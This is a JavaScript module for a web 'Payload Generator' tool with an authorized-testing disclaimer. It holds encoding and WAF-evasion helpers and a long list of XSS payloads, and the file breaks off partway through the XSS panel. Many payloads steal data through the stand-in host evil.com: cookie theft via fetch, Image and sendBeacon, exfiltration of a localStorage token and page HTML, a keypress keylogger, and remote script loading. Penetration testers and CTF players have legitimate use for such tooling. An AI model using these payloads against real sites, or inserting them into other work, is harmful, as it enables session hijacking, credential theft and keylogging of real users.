// Payload Generator — offensive security payload builder for authorized penetration testing,
// CTF practice, and lab use. Covers XSS, SQL injection, command injection, SSTI, XXE, SSRF,
// path traversal, LDAP injection, NoSQL injection, CRLF/header injection, deserialization
// gadget-chain reference material, and WAF bypass technique reference.
//
// Every payload here is standard, publicly documented offensive-security material (OWASP,
// PortSwigger, PayloadsAllTheThings-style references). Nothing in this module sends network
// requests on your behalf — it only builds strings for you to use in your own authorized
// testing tools (Burp Suite, curl, browser devtools, etc).

const esc = (s) => String(s ?? "").replace(/[&<>"']/g, (c) =>
  ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));

/* ------------------------------------------------------------------------------------------
 * Encoding / evasion primitives — shared across every payload category.
 * ---------------------------------------------------------------------------------------- */

const ENC = {};

ENC.none = (s) => s;

ENC.url = (s) => encodeURIComponent(s);

ENC.urlPlusSpace = (s) => encodeURIComponent(s).replace(/%20/g, "+");

ENC.doubleUrl = (s) => encodeURIComponent(encodeURIComponent(s));

ENC.tripleUrl = (s) => encodeURIComponent(encodeURIComponent(encodeURIComponent(s)));

ENC.urlAllChars = (s) => Array.from(s).map((c) => {
  const cp = c.codePointAt(0);
  if (cp < 128) return "%" + cp.toString(16).padStart(2, "0").toUpperCase();
  return encodeURIComponent(c);
}).join("");

ENC.base64 = (s) => {
  try { return btoa(unescape(encodeURIComponent(s))); } catch (_) { return s; }
};

ENC.base64Url = (s) => {
  try { return btoa(unescape(encodeURIComponent(s))).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, ""); }
  catch (_) { return s; }
};

ENC.hexEscape = (s) => Array.from(new TextEncoder().encode(s)).map((b) => "\\x" + b.toString(16).padStart(2, "0")).join("");

ENC.hexRaw = (s) => Array.from(new TextEncoder().encode(s)).map((b) => b.toString(16).padStart(2, "0")).join("");

ENC.hex0x = (s) => "0x" + Array.from(new TextEncoder().encode(s)).map((b) => b.toString(16).padStart(2, "0")).join("");

ENC.unicodeEscape = (s) => s.split("").map((c) => "\\u" + c.charCodeAt(0).toString(16).padStart(4, "0")).join("");

ENC.unicodeEscapeUpper = (s) => s.split("").map((c) => "%u" + c.charCodeAt(0).toString(16).padStart(4, "0").toUpperCase()).join("");

ENC.htmlDec = (s) => Array.from(s).map((c) => "&#" + c.codePointAt(0) + ";").join("");

ENC.htmlDecPadded = (s) => Array.from(s).map((c) => "&#00" + c.codePointAt(0) + ";").join("");

ENC.htmlHex = (s) => Array.from(s).map((c) => "&#x" + c.codePointAt(0).toString(16) + ";").join("");

ENC.htmlHexNoSemi = (s) => Array.from(s).map((c) => "&#x" + c.codePointAt(0).toString(16)).join("");

ENC.overlongUtf8 = (s) => Array.from(s).map((c) => {
  const cp = c.charCodeAt(0);
  if (cp > 0x7f) return c;
  const b1 = (0xc0 | (cp >> 6)).toString(16).padStart(2, "0");
  const b2 = (0x80 | (cp & 0x3f)).toString(16).padStart(2, "0");
  return "%" + b1 + "%" + b2;
}).join("");

ENC.mixedCase = (s) => s.split("").map((c, i) => (i % 2 === 0 ? c.toUpperCase() : c.toLowerCase())).join("");

ENC.upperCase = (s) => s.toUpperCase();

ENC.nullByteSuffix = (s) => s + "%00";

ENC.utf16le = (s) => s.split("").map((c) => { const cu = c.charCodeAt(0); return (cu & 0xff).toString(16).padStart(2, "0") + ((cu >> 8) & 0xff).toString(16).padStart(2, "0"); }).join("");

const ENC_LABELS = {
  none: "None (raw)",
  url: "URL encode",
  urlPlusSpace: "URL encode (+ for space)",
  doubleUrl: "Double URL encode",
  tripleUrl: "Triple URL encode",
  urlAllChars: "URL encode (all chars)",
  base64: "Base64",
  base64Url: "Base64 (URL-safe)",
  hexEscape: "Hex (\\xNN)",
  hexRaw: "Hex (raw NN)",
  hex0x: "Hex (0xNN...)",
  unicodeEscape: "Unicode (\\uNNNN)",
  unicodeEscapeUpper: "Unicode (%uNNNN)",
  htmlDec: "HTML entity (decimal)",
  htmlDecPadded: "HTML entity (decimal, zero-padded)",
  htmlHex: "HTML entity (hex)",
  htmlHexNoSemi: "HTML entity (hex, no semicolon)",
  overlongUtf8: "Overlong UTF-8 (2-byte)",
  mixedCase: "Mixed case",
  upperCase: "Upper case",
  nullByteSuffix: "Null byte suffix",
  utf16le: "UTF-16LE hex",
};

function applyEnc(mode, s) {
  const fn = ENC[mode] || ENC.none;
  try { return fn(s); } catch (_) { return s; }
}

/* ------------------------------------------------------------------------------------------
 * Small UI helpers
 * ---------------------------------------------------------------------------------------- */

function copyText(text) {
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(text).catch(() => fallbackCopy(text));
  } else {
    fallbackCopy(text);
  }
}

function fallbackCopy(text) {
  const ta = document.createElement("textarea");
  ta.value = text;
  ta.style.position = "fixed";
  ta.style.left = "-9999px";
  document.body.appendChild(ta);
  ta.select();
  try { document.execCommand("copy"); } catch (_) {}
  document.body.removeChild(ta);
}

function flashBtn(btn, label) {
  if (!btn) return;
  const orig = btn.textContent;
  btn.textContent = label || "copied";
  btn.disabled = true;
  setTimeout(() => { btn.textContent = orig; btn.disabled = false; }, 900);
}

function downloadText(filename, text) {
  const blob = new Blob([text], { type: "text/plain;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  setTimeout(() => URL.revokeObjectURL(url), 2000);
}

function encSelectHtml(id, modes, current) {
  return `<select class="tk-f" id="${id}">${modes.map((m) =>
    `<option value="${m}"${m === current ? " selected" : ""}>${esc(ENC_LABELS[m] || m)}</option>`).join("")}</select>`;
}

/* ------------------------------------------------------------------------------------------
 * Generic reference/generator panel — used by the simpler payload categories that don't need
 * bespoke option UIs (XXE, SSRF, path traversal, LDAP injection, NoSQL injection, CRLF
 * injection, header injection). Bespoke categories (XSS, SQLi, command injection, SSTI) get
 * their own dedicated render functions further down.
 * ---------------------------------------------------------------------------------------- */

function genericPanel(container, cfg) {
  // cfg: { key, title, desc, encModes, groups: [{ label, payloads: [{ p, note }] }] }
  let filterText = "";
  let encMode = cfg.encModes[0];
  let groupFilter = "all";

  function allItems() {
    const out = [];
    for (const g of cfg.groups) {
      for (const it of g.payloads) out.push({ p: it.p, note: it.note || "", group: g.label });
    }
    return out;
  }

  function visibleItems() {
    const ft = filterText.trim().toLowerCase();
    return allItems().filter((it) => {
      if (groupFilter !== "all" && it.group !== groupFilter) return false;
      if (!ft) return true;
      return it.p.toLowerCase().includes(ft) || it.note.toLowerCase().includes(ft) || it.group.toLowerCase().includes(ft);
    });
  }

  function paint() {
    const items = visibleItems();
    const total = allItems().length;
    container.innerHTML = `
      <div class="panel pg-panel-inner">
        <h2 class="pg-h2" style="margin-top:0">${esc(cfg.title)}</h2>
        <p class="muted">${cfg.desc}</p>
        <div class="tk-row pg-opts-row">
          <input class="tk-f" id="gp-filter" placeholder="filter payloads / notes..." value="${esc(filterText)}" style="flex:2;min-width:200px">
          <select class="tk-f" id="gp-group" style="min-width:160px">
            <option value="all"${groupFilter === "all" ? " selected" : ""}>All groups</option>
            ${cfg.groups.map((g) => `<option value="${esc(g.label)}"${groupFilter === g.label ? " selected" : ""}>${esc(g.label)}</option>`).join("")}
          </select>
          ${encSelectHtml("gp-enc", cfg.encModes, encMode)}
        </div>
        <div class="tk-btns" style="margin:10px 0">
          <button class="btn sm" id="gp-copyall">Copy all shown (${items.length})</button>
          <button class="btn sm ghost" id="gp-download">Download .txt</button>
        </div>
        <div class="pg-stats-row">
          <div class="stat"><div class="stat-n">${items.length}</div><div class="stat-l">shown</div></div>
          <div class="stat"><div class="stat-n">${total}</div><div class="stat-l">total in library</div></div>
          <div class="stat"><div class="stat-n">${cfg.groups.length}</div><div class="stat-l">categories</div></div>
        </div>
        <div class="pg-list" id="gp-list">${items.map((it, i) => `
          <div class="pg-item">
            <div class="pg-item-top"><span class="pg-item-group">${esc(it.group)}</span><button class="btn sm ghost pg-copy" data-i="${i}">copy</button></div>
            <code class="dl-cmd cmd-block pg-code">${esc(applyEnc(encMode, it.p))}</code>
            ${it.note ? `<div class="pg-note muted">${esc(it.note)}</div>` : ""}
          </div>`).join("") || `<div class="muted" style="padding:20px;text-align:center">No payloads match that filter.</div>`}
        </div>
      </div>`;

    container.querySelector("#gp-filter").oninput = (e) => { filterText = e.target.value; paint(); };
    container.querySelector("#gp-group").onchange = (e) => { groupFilter = e.target.value; paint(); };
    container.querySelector("#gp-enc").onchange = (e) => { encMode = e.target.value; paint(); };
    container.querySelector("#gp-copyall").onclick = (e) => { copyText(items.map((it) => applyEnc(encMode, it.p)).join("\n")); flashBtn(e.target, "copied!"); };
    container.querySelector("#gp-download").onclick = () => downloadText(cfg.key + "-payloads.txt", items.map((it) => applyEnc(encMode, it.p)).join("\n"));
    container.querySelectorAll(".pg-copy").forEach((b) => {
      b.onclick = () => { copyText(applyEnc(encMode, items[+b.dataset.i].p)); flashBtn(b, "copied"); };
    });
  }

  paint();
}

/* ------------------------------------------------------------------------------------------
 * Shared CSS for the whole module
 * ---------------------------------------------------------------------------------------- */

const PG_STYLE = `
<style>
  .pg-warn{border-left:3px solid var(--warn,#f5b041);background:rgba(245,176,65,.08);font-size:.85rem;line-height:1.5}
  .pg-warn strong{color:var(--warn,#f5b041)}
  .tab-bar{display:flex;flex-wrap:wrap;gap:6px;border-bottom:1px solid var(--line);padding-bottom:10px;margin:18px 0 18px}
  .tab-bar .tab{background:var(--card);border:1px solid var(--line);color:var(--mut);padding:7px 13px;border-radius:4px;font-size:.78rem;font-weight:600;cursor:pointer;white-space:nowrap;transition:border-color .15s,color .15s,background .15s}
  .tab-bar .tab:hover{color:var(--txt);border-color:var(--acc-line,var(--acc))}
  .tab-bar .tab.active{background:var(--acc);color:var(--on-acc,#000);border-color:var(--acc)}
  .pg-panel-inner{margin-top:0}
  .pg-opts-row{flex-wrap:wrap;align-items:center}
  .pg-stats-row{display:flex;gap:10px;flex-wrap:wrap;margin:12px 0}
  .pg-stats-row .stat{flex:1;min-width:110px}
  .pg-list{display:flex;flex-direction:column;gap:10px;max-height:640px;overflow-y:auto;padding-right:4px}
  .pg-item{background:var(--bg);border:1px solid var(--line);border-radius:8px;padding:10px 12px}
  .pg-item-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;gap:8px}
  .pg-item-group{font-size:.68rem;font-weight:700;letter-spacing:.06em;text-transform:uppercase;color:var(--acc)}
  .pg-code{display:block;width:100%;white-space:pre-wrap;word-break:break-all;font-size:.78rem;margin:0}
  .pg-note{font-size:.74rem;margin-top:5px}
  .pg-check-row{display:flex;flex-wrap:wrap;gap:12px;margin:10px 0;font-size:.8rem}
  .pg-check-row label{display:flex;align-items:center;gap:6px;cursor:pointer;background:var(--card);border:1px solid var(--line);padding:6px 10px;border-radius:4px}
  .pg-check-row label:hover{border-color:var(--acc-line,var(--acc))}
  .pg-check-row input{accent-color:var(--acc)}
  .pg-select-row{display:flex;gap:8px;flex-wrap:wrap;margin:10px 0}
  .pg-count-badge{display:inline-block;background:var(--acc-soft,rgba(124,92,255,.12));color:var(--acc);font-size:.7rem;font-weight:700;padding:2px 9px;border-radius:20px;margin-left:8px}
  .pg-ref-card{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:16px;margin-bottom:14px}
  .pg-ref-card h3{margin:0 0 6px;font-size:1rem;color:var(--acc)}
  .pg-ref-card .pg-ref-meta{font-size:.72rem;color:var(--mut);margin-bottom:10px}
  .pg-ref-card pre{background:var(--bg);border:1px solid var(--line);border-radius:6px;padding:10px;overflow-x:auto;font-size:.76rem;white-space:pre-wrap;word-break:break-word}
  .pg-waf-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:12px}
  .pg-waf-card{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:14px}
  .pg-waf-card h4{margin:0 0 6px;font-size:.9rem}
  .pg-waf-card code{display:block;background:var(--bg);border:1px solid var(--line);border-radius:6px;padding:8px;font-size:.74rem;margin-top:6px;white-space:pre-wrap;word-break:break-all}
  .pg-waf-tag{display:inline-block;font-size:.62rem;font-weight:700;letter-spacing:.05em;text-transform:uppercase;color:var(--acc-2,var(--acc));background:rgba(124,92,255,.1);padding:2px 7px;border-radius:20px;margin-bottom:8px}
  .pg-sub-tabs{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:12px}
  .pg-sub-tabs button{background:var(--bg);border:1px solid var(--line);color:var(--mut);padding:5px 12px;border-radius:4px;font-size:.74rem;font-weight:600;cursor:pointer}
  .pg-sub-tabs button.active{background:var(--acc);color:var(--on-acc,#000);border-color:var(--acc)}
  .pg-variant-count{font-size:.8rem;color:var(--mut);margin:6px 0}
  .pg-empty{padding:24px;text-align:center;color:var(--mut)}
  @media (max-width:640px){.pg-list{max-height:480px}}
</style>`;

/* ------------------------------------------------------------------------------------------
 * Entry point
 * ---------------------------------------------------------------------------------------- */

export function renderPayloadGen(main) {
  const TABS = [
    ["xss", "XSS"],
    ["sqli", "SQL Injection"],
    ["cmdi", "Command Injection"],
    ["ssti", "SSTI"],
    ["xxe", "XXE"],
    ["ssrf", "SSRF"],
    ["path", "Path Traversal"],
    ["ldap", "LDAP Injection"],
    ["nosql", "NoSQL Injection"],
    ["crlf", "CRLF Injection"],
    ["header", "Header Injection"],
    ["deser", "Deserialization"],
    ["waf", "WAF Bypass"],
  ];

  main.innerHTML = `
    ${PG_STYLE}
    <h1 class="pg-h1">Payload Generator</h1>
    <p class="muted pg-sub">Build, encode, and export offensive-security payloads across thirteen vulnerability classes. For use only against systems you own or are explicitly authorized to test.</p>
    <div class="card pg-warn">
      <strong>Authorized use only.</strong> These payloads are provided for penetration testing engagements you are contracted or authorized to perform, CTF competitions, and personal lab environments. Using these against systems without permission is illegal in most jurisdictions. Darknode is not responsible for misuse.
    </div>
    <div class="tab-bar" id="pgTabs" role="tablist">
      ${TABS.map(([id, label], i) => `<button class="tab${i === 0 ? " active" : ""}" role="tab" data-tab="${id}">${esc(label)}</button>`).join("")}
    </div>
    <div id="pgPanel"></div>
  `;

  const panelEl = main.querySelector("#pgPanel");
  const tabsEl = main.querySelector("#pgTabs");

  const RENDERERS = {
    xss: renderXSSPanel,
    sqli: renderSQLiPanel,
    cmdi: renderCmdiPanel,
    ssti: renderSSTIPanel,
    xxe: renderXXEPanel,
    ssrf: renderSSRFPanel,
    path: renderPathPanel,
    ldap: renderLdapPanel,
    nosql: renderNoSQLPanel,
    crlf: renderCrlfPanel,
    header: renderHeaderPanel,
    deser: renderDeserPanel,
    waf: renderWafPanel,
  };

  function showTab(id) {
    tabsEl.querySelectorAll(".tab").forEach((b) => b.classList.toggle("active", b.dataset.tab === id));
    const fn = RENDERERS[id];
    if (fn) fn(panelEl);
  }

  tabsEl.addEventListener("click", (e) => {
    const btn = e.target.closest(".tab");
    if (!btn) return;
    showTab(btn.dataset.tab);
  });

  showTab("xss");
}

/* ============================================================================================
 * XSS — Cross-Site Scripting
 * ========================================================================================== */

const XSS_PAYLOADS = [
  { p: "<script>alert(1)</script>", cat: "Script tag", ctx: "html", type: "reflected" },
  { p: "<script>alert('XSS')</script>", cat: "Script tag", ctx: "html", type: "reflected" },
  { p: "<script>alert(document.cookie)</script>", cat: "Script tag", ctx: "html", type: "reflected" },
  { p: "<script>alert(document.domain)</script>", cat: "Script tag", ctx: "html", type: "reflected" },
  { p: "<script>confirm(1)</script>", cat: "Script tag", ctx: "html", type: "reflected" },
  { p: "<script>prompt(1)</script>", cat: "Script tag", ctx: "html", type: "reflected" },
  { p: "<script>alert(String.fromCharCode(88,83,83))</script>", cat: "Script tag", ctx: "html", type: "reflected" },
  { p: "<script src=//evil.com/x.js></script>", cat: "Script tag", ctx: "html", type: "reflected" },
  { p: "<script>fetch('//evil.com/c?c='+document.cookie)</script>", cat: "Script tag", ctx: "html", type: "reflected" },
  { p: "<script>new Image().src='//evil.com/c?c='+document.cookie</script>", cat: "Script tag", ctx: "html", type: "reflected" },
  { p: "<img src=x onerror=alert(1)>", cat: "Event handler", ctx: "html", type: "reflected" },
  { p: "<img src=x onerror=alert(document.cookie)>", cat: "Event handler", ctx: "html", type: "reflected" },
  { p: "<svg onload=alert(1)>", cat: "Event handler", ctx: "html", type: "reflected" },
  { p: "<svg/onload=alert(1)>", cat: "Event handler", ctx: "html", type: "reflected" },
  { p: "<body onload=alert(1)>", cat: "Event handler", ctx: "html", type: "reflected" },
  { p: "<input onfocus=alert(1) autofocus>", cat: "Event handler", ctx: "html", type: "reflected" },
  { p: "<select onfocus=alert(1) autofocus>", cat: "Event handler", ctx: "html", type: "reflected" },
  { p: "<textarea onfocus=alert(1) autofocus>", cat: "Event handler", ctx: "html", type: "reflected" },
  { p: "<keygen onfocus=alert(1) autofocus>", cat: "Event handler", ctx: "html", type: "reflected" },
  { p: "<video><source onerror=alert(1)>", cat: "Event handler", ctx: "html", type: "reflected" },
  { p: "<audio src=x onerror=alert(1)>", cat: "Event handler", ctx: "html", type: "reflected" },
  { p: "<details open ontoggle=alert(1)>", cat: "Event handler", ctx: "html", type: "reflected" },
  { p: "<marquee onstart=alert(1)>", cat: "Event handler", ctx: "html", type: "reflected" },
  { p: "<iframe onload=alert(1)>", cat: "Event handler", ctx: "html", type: "reflected" },
  { p: "<iframe src=javascript:alert(1)>", cat: "Event handler", ctx: "html", type: "reflected" },
  { p: "<svg><script>alert(1)</script></svg>", cat: "Tag alternative", ctx: "html", type: "reflected" },
  { p: "<math><mtext><script>alert(1)</script></mtext></math>", cat: "Tag alternative", ctx: "html", type: "reflected" },
  { p: "<object data=javascript:alert(1)>", cat: "Tag alternative", ctx: "html", type: "reflected" },
  { p: "<embed src=javascript:alert(1)>", cat: "Tag alternative", ctx: "html", type: "reflected" },
  { p: "<form action=javascript:alert(1)><input type=submit>", cat: "Tag alternative", ctx: "html", type: "reflected" },
  { p: "<isindex type=image src=1 onerror=alert(1)>", cat: "Tag alternative", ctx: "html", type: "reflected" },
  { p: "<base href=javascript:alert(1)//>", cat: "Tag alternative", ctx: "html", type: "reflected" },
  { p: "<link rel=import href=data:text/html,<script>alert(1)</script>>", cat: "Tag alternative", ctx: "html", type: "reflected" },
  { p: "<meta http-equiv=refresh content=0;url=javascript:alert(1)>", cat: "Tag alternative", ctx: "html", type: "reflected" },
  { p: "<table background=javascript:alert(1)>", cat: "Tag alternative", ctx: "html", type: "reflected" },
  { p: "<ScRiPt>alert(1)</sCriPt>", cat: "Filter bypass", ctx: "html", type: "reflected" },
  { p: "<img src=x onerror=alert`1`>", cat: "Filter bypass", ctx: "html", type: "reflected" },
  { p: "<img src=x onerror=alert&lpar;1&rpar;>", cat: "Filter bypass", ctx: "html", type: "reflected" },
  { p: "<svg/onload=&#97;lert(1)>", cat: "Filter bypass", ctx: "html", type: "reflected" },
  { p: "<img src=x:alert(alt) onerror=eval(src) alt=xss>", cat: "Filter bypass", ctx: "html", type: "reflected" },
  { p: "<img src=x onerror=window['alert'](1)>", cat: "Filter bypass", ctx: "html", type: "reflected" },
  { p: "<img src=x onerror=top['al'+'ert'](1)>", cat: "Filter bypass", ctx: "html", type: "reflected" },
  { p: "<img src=\"x`onerror=alert(1)\">", cat: "Filter bypass", ctx: "html", type: "reflected" },
  { p: "<img src=x onerror=alert(/xss/)>", cat: "Filter bypass", ctx: "html", type: "reflected" },
  { p: "<a href=\"javascript:alert(1)\">click</a>", cat: "Filter bypass", ctx: "html", type: "reflected" },
  { p: "<a href=\"javascript&colon;alert(1)\">click</a>", cat: "Filter bypass", ctx: "html", type: "reflected" },
  { p: "<img src=x onerror=\"ale\\u0072t(1)\">", cat: "Filter bypass", ctx: "html", type: "reflected" },
  { p: "<svg><script>alert&#40;1&#41;</script></svg>", cat: "Filter bypass", ctx: "html", type: "reflected" },
  { p: "<img src=1 onerror=al\\u0065rt(1)>", cat: "Filter bypass", ctx: "html", type: "reflected" },
  { p: "<img/src=x/onerror=alert(1)>", cat: "Filter bypass", ctx: "html", type: "reflected" },
  { p: "<img src=x onError=alert(1)>", cat: "Filter bypass", ctx: "html", type: "reflected" },
  { p: "<img\\nsrc=x\\nonerror=alert(1)>", cat: "Filter bypass", ctx: "html", type: "reflected" },
  { p: "<img\\tsrc=x\\tonerror=alert(1)>", cat: "Filter bypass", ctx: "html", type: "reflected" },
  { p: "<<script>alert(1)//<</script>", cat: "Filter bypass", ctx: "html", type: "reflected" },
  { p: "<scr<script>ipt>alert(1)</scr</script>ipt>", cat: "Filter bypass", ctx: "html", type: "reflected" },
  { p: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", cat: "Polyglot", ctx: "html", type: "reflected" },
  { p: "\"><svg onload=alert(1)>", cat: "Polyglot", ctx: "attr", type: "reflected" },
  { p: "'><svg onload=alert(1)>", cat: "Polyglot", ctx: "attr", type: "reflected" },
  { p: "</script><script>alert(1)</script>", cat: "Polyglot", ctx: "js", type: "reflected" },
  { p: "--></style></script><script>alert(1)</script>", cat: "Polyglot", ctx: "css", type: "reflected" },
  { p: "#<img src=x onerror=alert(1)>", cat: "DOM-based", ctx: "url", type: "dom" },
  { p: "javascript:alert(document.domain)", cat: "DOM-based", ctx: "url", type: "dom" },
  { p: "javascript:alert(1)//", cat: "DOM-based", ctx: "url", type: "dom" },
  { p: "data:text/html,<script>alert(1)</script>", cat: "DOM-based", ctx: "url", type: "dom" },
  { p: "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", cat: "DOM-based", ctx: "url", type: "dom" },
  { p: "<img src=x onerror=eval(location.hash.slice(1))>", cat: "DOM-based", ctx: "html", type: "dom" },
  { p: "<script>eval(atob(location.search.slice(1)))</script>", cat: "DOM-based", ctx: "js", type: "dom" },
  { p: "<script>document.write('<img src=x onerror=alert(1)>')</script>", cat: "DOM-based", ctx: "js", type: "dom" },
  { p: "<script>document.location='javascript:alert(1)'</script>", cat: "DOM-based", ctx: "js", type: "dom" },
  { p: "<script>window.name='alert(1)';eval(window.name)</script>", cat: "DOM-based", ctx: "js", type: "dom" },
  { p: "<script>fetch('https://evil.com/steal?c='+encodeURIComponent(document.cookie))</script>", cat: "Stored / exfiltration", ctx: "js", type: "stored" },
  { p: "<script>new Image().src='https://evil.com/log?d='+btoa(document.cookie)</script>", cat: "Stored / exfiltration", ctx: "js", type: "stored" },
  { p: "<script>var i=new Image();i.src='//evil.com/'+document.cookie;</script>", cat: "Stored / exfiltration", ctx: "js", type: "stored" },
  { p: "<svg onload=fetch('//evil.com/'+document.cookie)>", cat: "Stored / exfiltration", ctx: "html", type: "stored" },
  { p: "<img src=x onerror=this.src='//evil.com/'+document.cookie>", cat: "Stored / exfiltration", ctx: "html", type: "stored" },
  { p: "<script>navigator.sendBeacon('//evil.com/b',document.cookie)</script>", cat: "Stored / exfiltration", ctx: "js", type: "stored" },
  { p: "<script>fetch('//evil.com/'+btoa(document.documentElement.innerHTML))</script>", cat: "Stored / exfiltration", ctx: "js", type: "stored" },
  { p: "<script>fetch('//evil.com/keylog',{method:'POST',body:localStorage.getItem('token')})</script>", cat: "Stored / exfiltration", ctx: "js", type: "stored" },
  { p: "<script>document.addEventListener('keypress',e=>fetch('//evil.com/k?c='+e.key))</script>", cat: "Stored / exfiltration", ctx: "js", type: "stored" },
  { p: "<script>setInterval(()=>fetch('//evil.com/c?c='+document.cookie),5000)</script>", cat: "Stored / exfiltration", ctx: "js", type: "stored" },
  { p: "\" onmouseover=\"alert(1)", cat: "Attribute breakout", ctx: "attr", type: "reflected" },
  { p: "' onmouseover='alert(1)", cat: "Attribute breakout", ctx: "attr", type: "reflected" },
  { p: "\" autofocus onfocus=\"alert(1)", cat: "Attribute breakout", ctx: "attr", type: "reflected" },
  { p: "\"><script>alert(1)</script>", cat: "Attribute breakout", ctx: "attr", type: "reflected" },
  { p: "'><script>alert(1)</script>", cat: "Attribute breakout", ctx: "attr", type: "reflected" },
  { p: "\" onerror=\"alert(1)\" x=\"", cat: "Attribute breakout", ctx: "attr", type: "reflected" },
  { p: "javascript:alert(1)", cat: "Attribute breakout", ctx: "attr", type: "reflected" },
  { p: "\" style=\"background:url(javascript:alert(1))", cat: "Attribute breakout", ctx: "attr", type: "reflected" },
  { p: "\" onclick=\"alert(1)", cat: "Attribute breakout", ctx: "attr", type: "reflected" },
  { p: "`-alert(1)-`", cat: "Attribute breakout", ctx: "attr", type: "reflected" },
  { p: "<style>@import 'javascript:alert(1)';</style>", cat: "CSS / style context", ctx: "css", type: "reflected" },
  { p: "<div style=\"background:url('javascript:alert(1)')\">", cat: "CSS / style context", ctx: "css", type: "reflected" },
  { p: "<style>body{background:url(\"javascript:alert(1)\")}</style>", cat: "CSS / style context", ctx: "css", type: "reflected" },
  { p: "expression(alert(1))", cat: "CSS / style context", ctx: "css", type: "reflected" },
  { p: "<div style=width:expression(alert(1))>", cat: "CSS / style context", ctx: "css", type: "reflected" },
  { p: "{{constructor.constructor('alert(1)')()}}", cat: "Template / misc", ctx: "js", type: "dom" },
  { p: "${alert(1)}", cat: "Template / misc", ctx: "js", type: "dom" },
  { p: "<x contenteditable onblur=alert(1)>lose focus!</x>", cat: "Template / misc", ctx: "html", type: "reflected" },
  { p: "<plaintext onmouseover=alert(1)>", cat: "Template / misc", ctx: "html", type: "reflected" },
  { p: "<xss id=x onfocus=alert(1) tabindex=1></xss>#x", cat: "Template / misc", ctx: "html", type: "reflected" },
];

const XSS_TRANSFORMS = {
  caseVariation: { label: "Case variation (ScRiPt)", fn: (s) => s.split("").map((c, i) => (/[a-zA-Z]/.test(c) ? (i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()) : c)).join("") },
  nullBytePrefix: { label: "Null byte before tags (%00)", fn: (s) => s.replace(/</g, "<%00") },
  whitespaceTab: { label: "Space -> tab (%09)", fn: (s) => s.replace(/ /g, "%09") },
  whitespaceSlash: { label: "Space -> slash (/)", fn: (s) => s.replace(/ (?=[a-zA-Z]+=)/g, "/") },
  backtickCall: { label: "Parens -> backticks (alert`1`)", fn: (s) => s.replace(/alert\(([^)]*)\)/g, "alert`$1`").replace(/confirm\(([^)]*)\)/g, "confirm`$1`").replace(/prompt\(([^)]*)\)/g, "prompt`$1`") },
  urlEncode: { label: "URL-encode", fn: (s) => ENC.url(s) },
  doubleUrlEncode: { label: "Double URL-encode", fn: (s) => ENC.doubleUrl(s) },
  htmlEntity: { label: "HTML entity (decimal)", fn: (s) => ENC.htmlDec(s) },
  htmlEntityHex: { label: "HTML entity (hex)", fn: (s) => ENC.htmlHex(s) },
  unicodeEscape: { label: "Unicode escape (\\uNNNN)", fn: (s) => ENC.unicodeEscape(s) },
};

function xssBuildVariants(base, selectedKeys, mode) {
  if (!selectedKeys.length) return [{ p: base, label: "raw" }];
  if (mode === "chain") {
    let out = base;
    for (const k of selectedKeys) out = XSS_TRANSFORMS[k].fn(out);
    return [{ p: out, label: selectedKeys.map((k) => XSS_TRANSFORMS[k].label).join(" + ") }];
  }
  return selectedKeys.map((k) => ({ p: XSS_TRANSFORMS[k].fn(base), label: XSS_TRANSFORMS[k].label }));
}

function renderXSSPanel(container) {
  const CATS = Array.from(new Set(XSS_PAYLOADS.map((p) => p.cat)));
  let catFilter = "all";
  let typeFilter = "all";
  let search = "";
  let selectedTransforms = [];
  let mode = "chain";

  function baseFiltered() {
    const q = search.trim().toLowerCase();
    return XSS_PAYLOADS.filter((it) => {
      if (catFilter !== "all" && it.cat !== catFilter) return false;
      if (typeFilter !== "all" && it.type !== typeFilter) return false;
      if (q && !it.p.toLowerCase().includes(q) && !it.cat.toLowerCase().includes(q)) return false;
      return true;
    });
  }

  function buildAll() {
    const base = baseFiltered();
    const out = [];
    for (const b of base) {
      for (const v of xssBuildVariants(b.p, selectedTransforms, mode)) {
        out.push({ p: v.p, label: v.label, cat: b.cat, type: b.type, ctx: b.ctx });
      }
    }
    return out;
  }

  function paint() {
    const variants = buildAll();
    container.innerHTML = `
      <div class="panel pg-panel-inner">
        <h2 class="pg-h2" style="margin-top:0">XSS Payload Generator <span class="pg-count-badge">${XSS_PAYLOADS.length} base payloads</span></h2>
        <p class="muted">Reflected, stored, and DOM-based cross-site scripting payloads with configurable filter-bypass transforms. Select one or more transforms to generate encoded/evasive variants.</p>
        <div class="tk-row pg-opts-row">
          <input class="tk-f" id="xss-search" placeholder="search payloads..." value="${esc(search)}" style="flex:2;min-width:180px">
          <select class="tk-f" id="xss-cat" style="min-width:170px">
            <option value="all"${catFilter === "all" ? " selected" : ""}>All categories</option>
            ${CATS.map((c) => `<option value="${esc(c)}"${catFilter === c ? " selected" : ""}>${esc(c)}</option>`).join("")}
          </select>
          <select class="tk-f" id="xss-type" style="min-width:150px">
            <option value="all"${typeFilter === "all" ? " selected" : ""}>All types</option>
            <option value="reflected"${typeFilter === "reflected" ? " selected" : ""}>Reflected</option>
            <option value="stored"${typeFilter === "stored" ? " selected" : ""}>Stored</option>
            <option value="dom"${typeFilter === "dom" ? " selected" : ""}>DOM-based</option>
          </select>
        </div>
        <div class="pg-select-row">
          <label class="mono muted" style="display:flex;align-items:center;gap:6px;font-size:.78rem">
            <input type="radio" name="xss-mode" value="chain" ${mode === "chain" ? "checked" : ""} id="xss-mode-chain"> Chain selected transforms (one variant per payload)
          </label>
          <label class="mono muted" style="display:flex;align-items:center;gap:6px;font-size:.78rem">
            <input type="radio" name="xss-mode" value="each" ${mode === "each" ? "checked" : ""} id="xss-mode-each"> Apply each transform separately (more variants)
          </label>
        </div>
        <div class="pg-check-row" id="xss-transforms">
